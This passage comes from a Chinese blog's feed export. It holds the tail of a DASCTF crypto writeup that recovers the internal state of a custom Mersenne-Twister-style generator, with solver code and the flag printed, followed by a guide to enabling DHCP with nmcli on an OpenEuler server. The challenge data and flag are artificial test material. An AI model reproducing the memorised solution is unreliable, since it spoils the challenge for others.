class="hljs-number">2877704207</span>, <span class="hljs-number">3243106071</span>, <span class="hljs-number">1633372043</span>, <span class="hljs-number">2152178033</span>, <span class="hljs-number">2993246714</span>, <span class="hljs-number">4176238981</span>, <span class="hljs-number">3828458887</span>, <span class="hljs-number">695369535</span>, <span class="hljs-number">2514762808</span>, <span class="hljs-number">2251430819</span>, <span class="hljs-number">2743651063</span>, <span class="hljs-number">783239046</span>, <span class="hljs-number">4036497041</span>, <span class="hljs-number">2175424426</span>, <span class="hljs-number">765021321</span>, <span class="hljs-number">897227922</span>, <span class="hljs-number">3192938155</span>, <span class="hljs-number">4173350810</span>, <span class="hljs-number">2290496185</span>, <span class="hljs-number">4215986056</span>, <span class="hljs-number">2448481441</span>, <span class="hljs-number">3114984799</span>, <span class="hljs-number">2920066349</span>, <span class="hljs-number">722868808</span>, <span class="hljs-number">594363801</span>, <span class="hljs-number">4012575088</span>, <span class="hljs-number">454547939</span>, <span class="hljs-number">3331771662</span>, <span class="hljs-number">1267229957</span>, <span class="hljs-number">3170277692</span>, <span class="hljs-number">2446344734</span>, <span class="hljs-number">3730529788</span>, <span class="hljs-number">2621611481</span>, <span class="hljs-number">2972284304</span>, <span class="hljs-number">2580290241</span>, <span class="hljs-number">486727007</span>, <span class="hljs-number">2727955445</span>, <span class="hljs-number">1457071884</span>, <span class="hljs-number">1053028185</span>, <span class="hljs-number">462301682</span>, <span class="hljs-number">3907840756</span>, <span class="hljs-number">1832398102</span>, <span class="hljs-number">3144685297</span>, <span class="hljs-number">3403964915</span>, <span class="hljs-number">4263570498</span>, <span class="hljs-number">792776003</span>, <span class="hljs-number">306771255</span>, <span class="hljs-number">1633688240</span>, <span class="hljs-number">2159479271</span>, <span class="hljs-number">942060576</span>, <span class="hljs-number">1311531808</span>, <span class="hljs-number">3145754189</span>, <span class="hljs-number">4142271069</span>, <span class="hljs-number">2844524541</span>, <span class="hljs-number">4082439147</span>, <span class="hljs-number">2847276716</span>, <span class="hljs-number">1374436698</span>, <span class="hljs-number">2601522390</span>, <span class="hljs-number">529644524</span>, <span class="hljs-number">206090172</span>, <span class="hljs-number">3015114937</span>, <span class="hljs-number">4137169373</span>, <span class="hljs-number">2600331537</span>, <span class="hljs-number">344659140</span>, <span class="hljs-number">155319271</span>, <span class="hljs-number">1724932164</span>, <span class="hljs-number">3187877676</span>, <span class="hljs-number">4020168431</span>, <span class="hljs-number">711431575</span>, <span class="hljs-number">4123955169</span>, <span class="hljs-number">2539963709</span>, <span class="hljs-number">2764832709</span>, <span class="hljs-number">3897838285</span>, <span class="hljs-number">2521203644</span>, <span class="hljs-number">2059212822</span>, <span class="hljs-number">1129046005</span>, <span class="hljs-number">3277260664</span>, <span class="hljs-number">2739869189</span>, <span class="hljs-number">1955591901</span>, <span class="hljs-number">2661672178</span>, <span class="hljs-number">2926355273</span>, <span class="hljs-number">28176978</span>, <span class="hljs-number">706409211</span>, <span class="hljs-number">1432061304</span>, <span class="hljs-number">26517996</span>, <span class="hljs-number">3180196905</span>, <span class="hljs-number">2178525849</span>, <span class="hljs-number">607854674</span>, <span class="hljs-number">3953350517</span>, <span class="hljs-number">3532394548</span>, <span class="hljs-number">4175940932</span>, <span class="hljs-number">626671309</span>, <span class="hljs-number">1273934270</span>, <span class="hljs-number">3481828801</span>, <span class="hljs-number">22643989</span>, <span class="hljs-number">2104739013</span>, <span class="hljs-number">4183577772</span>, <span class="hljs-number">3932721637</span>, <span class="hljs-number">3075788222</span>, <span class="hljs-number">2814353001</span>, <span class="hljs-number">4120869721</span>, <span class="hljs-number">2045506903</span>, <span class="hljs-number">603494333</span>, <span class="hljs-number">335162960</span>, <span class="hljs-number">2069261279</span>, <span class="hljs-number">2278614835</span>, <span class="hljs-number">210140447</span>, <span class="hljs-number">2012566692</span>, <span class="hljs-number">2345710126</span>, <span class="hljs-number">70390387</span>, <span class="hljs-number">457247932</span>, <span class="hljs-number">2764651800</span>, <span class="hljs-number">652766919</span>, <span class="hljs-number">555253440</span>, <span class="hljs-number">864036913</span>, <span class="hljs-number">1720142260</span>, <span class="hljs-number">453262569</span>, <span class="hljs-number">1113437101</span>, <span class="hljs-number">2576419688</span>, <span class="hljs-number">144008475</span>, <span class="hljs-number">1786881829</span>, <span class="hljs-number">2455128823</span>, <span class="hljs-number">2884922345</span>, <span class="hljs-number">4251332234</span>, <span class="hljs-number">58949785</span>, <span class="hljs-number">4206002785</span>, <span class="hljs-number">3374754553</span>, <span class="hljs-number">2976162198</span>, <span class="hljs-number">546450687</span>, <span class="hljs-number">1268444784</span>, <span class="hljs-number">4132330381</span>, <span class="hljs-number">3404894280</span>, <span class="hljs-number">2421962142</span>, <span class="hljs-number">212361299</span>, <span class="hljs-number">2526283704</span>, <span class="hljs-number">1656118437</span>, <span class="hljs-number">1249336298</span>, <span class="hljs-number">305885855</span>, <span class="hljs-number">1090758249</span>, <span class="hljs-number">3752057640</span>, <span class="hljs-number">3508190692</span>, <span class="hljs-number">3637428</span>, <span class="hljs-number">105102422</span>, <span class="hljs-number">2247418237</span>, <span class="hljs-number">1873609555</span>, <span class="hljs-number">1206760240</span>, <span class="hljs-number">3761689119</span>, <span class="hljs-number">3151616638</span>, <span class="hljs-number">1711308858</span>, <span class="hljs-number">1261541178</span>, <span class="hljs-number">1843103377</span>, <span class="hljs-number">3158893523</span>, <span class="hljs-number">1226253110</span>, <span class="hljs-number">3337577909</span>, <span class="hljs-number">126612372</span>, <span class="hljs-number">2239219657</span>, <span class="hljs-number">1415387229</span>, <span class="hljs-number">3657507305</span>, <span class="hljs-number">3330696118</span>, <span class="hljs-number">2304219467</span>, <span class="hljs-number">3782535397</span>, <span class="hljs-number">2523926865</span>, <span class="hljs-number">173770442</span>, <span class="hljs-number">469421316</span>, <span class="hljs-number">4068724979</span>, <span class="hljs-number">567442650</span>, <span class="hljs-number">1996215573</span>, <span class="hljs-number">2071307093</span>, <span class="hljs-number">778899724</span>, <span class="hljs-number">3534102235</span>, <span class="hljs-number">1001138889</span>, <span class="hljs-number">2821812427</span>, <span class="hljs-number">591691317</span>, <span class="hljs-number">1265763678</span>, <span class="hljs-number">2241915660</span>, <span class="hljs-number">3220601768</span>, <span class="hljs-number">653090205</span>, <span class="hljs-number">2367897867</span>, <span class="hljs-number">1393909319</span>, <span class="hljs-number">2691817329</span>, <span class="hljs-number">3098049768</span>, <span class="hljs-number">117121403</span>, <span class="hljs-number">1255294678</span>, <span class="hljs-number">2272844919</span>, <span class="hljs-number">788255921</span>, <span class="hljs-number">2333869622</span>, <span class="hljs-number">4052660679</span>, <span class="hljs-number">2407095869</span>, <span class="hljs-number">2636108242</span>, <span class="hljs-number">2204717619</span>, <span class="hljs-number">1672726444</span>, <span class="hljs-number">2250826426</span>, <span class="hljs-number">258706466</span>, <span class="hljs-number">2295454699</span>, <span class="hljs-number">337308034</span>, <span class="hljs-number">3703973770</span>, <span class="hljs-number">3133498524</span>, <span class="hljs-number">22718827</span>, <span class="hljs-number">3096937679</span>, <span class="hljs-number">2039003308</span>, <span class="hljs-number">1519854757</span>, <span class="hljs-number">568184976</span>, <span class="hljs-number">1986854118</span>, <span class="hljs-number">2888207511</span>, <span class="hljs-number">822307630</span>, <span class="hljs-number">3829301724</span>, <span class="hljs-number">3198527490</span>, <span class="hljs-number">3073739663</span>, <span class="hljs-number">3043580445</span>, <span class="hljs-number">3458239370</span>, <span class="hljs-number">802145890</span>, <span class="hljs-number">376901460</span>, <span class="hljs-number">1251103099</span>, <span class="hljs-number">1143003993</span>, <span class="hljs-number">1280321148</span>, <span class="hljs-number">661386076</span>, <span class="hljs-number">3708710489</span>, <span class="hljs-number">2237151715</span>, <span class="hljs-number">3928104641</span>, <span class="hljs-number">2975550516</span>, <span class="hljs-number">1087492088</span>, <span class="hljs-number">1504028830</span>, <span class="hljs-number">61927086</span>, <span class="hljs-number">3858242888</span>, <span class="hljs-number">1916136658</span>, <span class="hljs-number">2328550074</span>, <span class="hljs-number">3032032377</span>, <span class="hljs-number">2193802260</span>, <span class="hljs-number">3311627503</span>, <span class="hljs-number">3196945045</span>, <span class="hljs-number">3396801792</span>, <span class="hljs-number">806210594</span>, <span class="hljs-number">2449941623</span>, <span class="hljs-number">2514744466</span>, <span class="hljs-number">3922130206</span>, <span class="hljs-number">3245757763</span>, <span class="hljs-number">3128328446</span>, <span class="hljs-number">2335833206</span>, <span class="hljs-number">3205660364</span>, <span class="hljs-number">3527402441</span>, <span class="hljs-number">2174241644</span>, <span class="hljs-number">1262568556</span>, <span class="hljs-number">2360103007</span>, <span class="hljs-number">2490217737</span>, <span class="hljs-number">1485100950</span>, <span class="hljs-number">3407260</span>, <span class="hljs-number">3005226942</span>, <span class="hljs-number">1355314866</span>, <span class="hljs-number">3154763465</span>, <span class="hljs-number">619881867</span>, <span class="hljs-number">2409963438</span>, <span class="hljs-number">2422269402</span>, <span class="hljs-number">205756019</span>, <span class="hljs-number">3300644241</span>, <span class="hljs-number">1157501775</span>, <span class="hljs-number">1229058028</span>, <span class="hljs-number">161050869</span>, <span class="hljs-number">969496287</span>, <span class="hljs-number">3385825249</span>, <span class="hljs-number">2557284067</span>, <span class="hljs-number">4236642714</span>, <span class="hljs-number">169094727</span>, <span class="hljs-number">2698326774</span>, <span class="hljs-number">1863176242</span>, <span class="hljs-number">3532885426</span>, <span class="hljs-number">3046403588</span>, <span class="hljs-number">3869207867</span>, <span class="hljs-number">496104150</span>, <span class="hljs-number">353604631</span>, <span class="hljs-number">1054882225</span>, <span class="hljs-number">152711981</span>, <span class="hljs-number">1362131890</span>, <span class="hljs-number">76912113</span>, <span class="hljs-number">3052177189</span>, <span class="hljs-number">3932252092</span>, <span class="hljs-number">3834713905</span>, <span class="hljs-number">2338378436</span>, <span class="hljs-number">44417325</span>, <span class="hljs-number">117723195</span>, <span class="hljs-number">1089433566</span>, <span class="hljs-number">4166617161</span>, <span class="hljs-number">2848021308</span>, <span class="hljs-number">2229619096</span>, <span class="hljs-number">319957702</span>, <span class="hljs-number">3661655667</span>, <span class="hljs-number">2809620731</span>, <span class="hljs-number">482011930</span>, <span class="hljs-number">3983483016</span>, <span class="hljs-number">82362287</span>, <span class="hljs-number">1518135562</span>, <span class="hljs-number">3490996143</span>, <span class="hljs-number">510129461</span>, <span class="hljs-number">1400609584</span>, <span class="hljs-number">2646113779</span>, <span class="hljs-number">732457215</span>, <span class="hljs-number">3735585198</span>, <span class="hljs-number">3451194227</span>, <span class="hljs-number">959269510</span>, <span class="hljs-number">244188667</span>]<br></code></pre></td></tr></table></figure><p>这里我也给出来吧，这样你们要是想做也能做了。</p><p>分析一下流程，我们最终实要得到这个<code>r.rand()</code>的值，我们才能得到flag。那么看一看rand是怎么运作的。</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rand</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">if</span> self.index == <span class="hljs-number">0</span>:<br>self.generate()<br>y = self.MT[self.index]<br>y = y ^ self.cs2l(y, <span class="hljs-number">11</span>) ^ self.cs2l(y,<span class="hljs-number">15</span>)<br>y = y ^ self.cs2r(y,<span class="hljs-number">7</span>) ^ self.cs2r(y,<span class="hljs-number">19</span>)<br>self.index = (self.index + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span><br><span class="hljs-keyword">return</span> y<br></code></pre></td></tr></table></figure><p>可以看到，当index为0的时候，会将MT重新生成。</p><p>产生rand的时候，使用当前的index作为索引，使用MT[index]为基值进行变换最后得到我们的rand，同时index增长1。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>r = Myrand(<span class="hljs-built_in">int</span>(os.urandom(<span class="hljs-number">4</span>).<span class="hljs-built_in">hex</span>(),<span class="hljs-number">16</span>))<br>out = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>out.append(r.rand())<br></code></pre></td></tr></table></figure><p>在主流程的时里面，这里我们生成了624个rand。那么我们生成flag的时候，index的值是0。所以我们在生成flag的时候，MT表会先进行重新的生成。那么我们想要得到flag就得先得到对应的MT表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">y = self.MT[self.index]<br>y = y ^ self.cs2l(y, <span class="hljs-number">11</span>) ^ self.cs2l(y,<span class="hljs-number">15</span>)<br>y = y ^ self.cs2r(y,<span class="hljs-number">7</span>) ^ self.cs2r(y,<span class="hljs-number">19</span>)<br></code></pre></td></tr></table></figure><p>这里可以看到，我们的y是一种循环位移异或的生成方式，而且一共有3项，是奇数项。所以这个过程是可逆的可以计算的。具体的算法可以参照一下链接:</p><p><a href="https://www.cnblogs.com/Tf1shC4T/p/15927062.html">https://www.cnblogs.com/Tf1shC4T/p/15927062.html</a></p><p>那么我们就可以得到对应的MT表。然后对这个表进行重新生成，取第一个数进行随机数生成即可得到对应的flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py </span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;output.txt&quot;</span>) <span class="hljs-keyword">as</span> fp:<br>    data = <span class="hljs-built_in">eval</span>(fp.read())<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cs2l</span>(<span class="hljs-params">y, shift</span>):<br>    shift %= <span class="hljs-number">32</span><br>    <span class="hljs-keyword">return</span> ((y &lt;&lt; shift) ^ (y &gt;&gt; (<span class="hljs-number">32</span> - shift))) &amp; <span class="hljs-number">0xffffffff</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cs2r</span>(<span class="hljs-params">y, shift</span>):<br>    shift %= <span class="hljs-number">32</span><br>    <span class="hljs-keyword">return</span> ((y &gt;&gt; shift) ^ (y &lt;&lt; (<span class="hljs-number">32</span> - shift))) &amp; <span class="hljs-number">0xffffffff</span><br><br><br>key_right = [<span class="hljs-number">7</span>, <span class="hljs-number">19</span>]<br>key_left = [<span class="hljs-number">11</span>, <span class="hljs-number">15</span>]<br><br><br><span class="hljs-comment"># 破解右移</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypted_first</span>(<span class="hljs-params">y, key</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        y = y ^ cs2r(y, key[<span class="hljs-number">0</span>]) ^ cs2r(y, key[<span class="hljs-number">1</span>])<br>        key = [k &lt;&lt; <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> key]<br>    <span class="hljs-keyword">return</span> y<br><br><br><span class="hljs-comment"># 破解左移</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypted_second</span>(<span class="hljs-params">y, key</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        y = y ^ cs2l(y, key[<span class="hljs-number">0</span>]) ^ cs2l(y, key[<span class="hljs-number">1</span>])<br>        key = [k &lt;&lt; <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> key]<br>    <span class="hljs-keyword">return</span> y<br><br><br>MT = []<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>        y = (MT[i] &amp; <span class="hljs-number">0x80000000</span>) + (MT[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span>] &amp; <span class="hljs-number">0x7fffffff</span>)<br>        MT[i] = MT[(i + <span class="hljs-number">397</span>) % <span class="hljs-number">624</span>] ^ (y &gt;&gt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> y &amp; <span class="hljs-number">1</span>:<br>            MT[i] ^= <span class="hljs-number">2567483520</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rand</span>(<span class="hljs-params">index=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> index == <span class="hljs-number">0</span>:<br>        generate()<br>    y = MT[index]<br>    y = y ^ cs2l(y, <span class="hljs-number">11</span>) ^ cs2l(y, <span class="hljs-number">15</span>)<br>    y = y ^ cs2r(y, <span class="hljs-number">7</span>) ^ cs2r(y, <span class="hljs-number">19</span>)<br>    index = (index + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span><br>    <span class="hljs-keyword">return</span> y<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    MT = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        MT.append(decrypted_second(decrypted_first(i, key_right), key_left))<br>    <span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>    flag = <span class="hljs-string">&#x27;DASCTF&#123;&#x27;</span> + md5(<span class="hljs-built_in">str</span>(rand()).encode()).hexdigest() + <span class="hljs-string">&#x27;&#125;&#x27;</span><br>    <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment"># DASCTF&#123;49e225e5b1b57a1d3c9803b5ddfd38f9&#125;</span><br><br></code></pre></td></tr></table></figure><p>这里对这个解密多将两句吧。</p><p>这个其实可以使用左移右移混杂的，只是这一题不行。</p><p>这个方法的使用条件是右边异或的项数必须是奇数个，而且第一项是没有位移的。</p><p>例如下面这种情况：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><mi>x</mi><mo>⊕</mo><mo stretchy="false">(</mo><mi>x</mi><mo>⋙</mo><mi>p</mi><mo stretchy="false">)</mo><mo>⊕</mo><mo stretchy="false">(</mo><mi>x</mi><mo>⋘</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y = x \oplus (x \ggg p) \oplus (x \lll q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⋙</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⋘</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span></span></p><p>那么对应的解密代码就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypted</span>(<span class="hljs-params">y, key</span>):<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bitslen): <span class="hljs-comment"># bitslen表示你进行运算的位宽度，这道题里面就是32位</span><br>y = y ^ cs2r(y, p) ^ cs2l(y, q)<br>key = [k &lt;&lt; <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> key]<br><span class="hljs-keyword">return</span> y<br></code></pre></td></tr></table></figure><p>提供对应的p,q也是可以解的。</p><h1 id="一些题外话"><a class="markdownIt-Anchor" href="#一些题外话"></a> 一些题外话</h1><p>好多题目都找不到writeup，每次打完一些比赛，想看看别人是怎么写出来那些我没写出来的题，但是基本上都找不到对应的Writeup。官方writeup也基本上没有。哎，也不认识那些大佬，想要题解都要不到。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>物理服务器OpenEuler系统DHCP网络环境配置</title>
    <link href="/2022/05/04/%E7%89%A9%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8OpenEuler%E7%B3%BB%E7%BB%9FDHCP%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2022/05/04/%E7%89%A9%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8OpenEuler%E7%B3%BB%E7%BB%9FDHCP%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>关于Taishan2280上的openeuler系统配置DHCP协议。</p><span id="more"></span><div class="note note-info">            <p>最后编辑于2022-05-05</p>          </div><p>学校有台Taishan2280服务器需要安装操作系统并且配置网络。需要安装的系统是OpenEuler。操作系统使用的是iBMC方式进行安装。这里不再赘述。</p><p>首先进入到服务器。</p><p>请在服务器对应的网口插入可以使用的网线。</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">nmcli dev status<br></code></pre></td></tr></table></figure><p>使用上述命令查看网络硬件设备。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# nmcli dev status<br>DEVICE      TYPE      STATE         CONNECTION<br>enp125s0f0  ethernet  已连接        web<br>virbr0      bridge    连接（外部）  virbr0<br>enp125s0f1  ethernet  已断开        --<br>enp125s0f2  ethernet  已断开        --<br>enp125s0f3  ethernet  已断开        --<br>lo          loopback  未托管        --<br>virbr0-nic  tun       未托管        --<br>[root@localhost ~]#<br></code></pre></td></tr></table></figure><p>这里我的enp125s0f0已经配置好了。</p><p>选择TYPE类型为ethernet的设备。记录下其设备名称。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">nmcli device connect device_name<br></code></pre></td></tr></table></figure><p>使用上述命令启用设备连接。</p><p>例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# nmcli device connect  enp125s0f1<br>错误：添加/激活新连接失败：Connection &#x27;enp125s0f1&#x27; is not available on device enp125s0f1 because device has no carrier<br></code></pre></td></tr></table></figure><p>这里由于我的一号网口没有插网线这里是失败的。所以你需要选择已插入网线的网口。网口顺序一般在服务器上都有标注。然后选择对应的设备即可。</p><p>连接完成后，使用以下指令启用DHCP。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmcli connection add type ethernet con-name connection-name ifname interface-name<br></code></pre></td></tr></table></figure><p>其中 <code>connection-name</code> 和 <code>interface-name</code>需要填写自己的配置。 <code>connection-name</code>填写自己的网络配置名称，如果没有这个网络配置，将会自动创建。</p><p><code>interface-name</code>填写你刚刚连接的网络设备。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# nmcli connection  add type  ethernet  con-name  web ifname  enp125s0f0<br>Connection &#x27;web&#x27; (fde481a7-0aba-432a-9201-e27603e556e8) successfully added.<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# nmcli con show<br>NAME        UUID                                  TYPE      DEVICE<br>web         fde481a7-0aba-432a-9201-e27603e556e8  ethernet  enp125s0f0<br>virbr0      dcce16f4-1934-4663-a2d1-4a908901628e  bridge    virbr0<br>enp125s0f0  a86a2809-b241-4627-9969-9bc95bb42e81  ethernet  --<br>enp125s0f1  dee58f2b-420f-4ab5-9986-66b3315c4616  ethernet  --<br>enp125s0f2  4780278c-90f1-42d5-9dfb-ee9c306e03af  ethernet  --<br>enp125s0f3  2063cbc1-644b-47f9-a151-e9812b2c5ce5  ethernet  --<br></code></pre></td></tr></table></figure><p>这样DHCP服务就在对应的设备启用。接下来只需要Reboot即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">Welcome to 5.10.0-60.18.0.50.oe2203.aarch64<br><br>System information as of time:  2022年 05月 04日 星期三 18:46:55 CST<br><br>System load:    0.08<br>Processes:      700<br>Memory used:    2.1%<br>Swap used:      0%<br>Usage On:       8%<br>IP address:     192.168.1.84<br>IP address:     192.168.122.1<br>Users online:   1<br><br><br>[root@localhost ~]#<br></code></pre></td></tr></table></figure><p>可以看到我们的IP地址多了一个。这就成功了。对应网口已经分配得到了IP。</p><p>122.1那个地址是服务器iBMC地址。</p>]]></content>
    
    
    
    <tags>
      
      <tag>server</tag>
      
      <tag>OpenEuler</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCC 2022</title>
    <link href="/2022/05/03/ISCC-2022/"/>
    <url>/2022/05/03/ISCC-2022/</url>
    
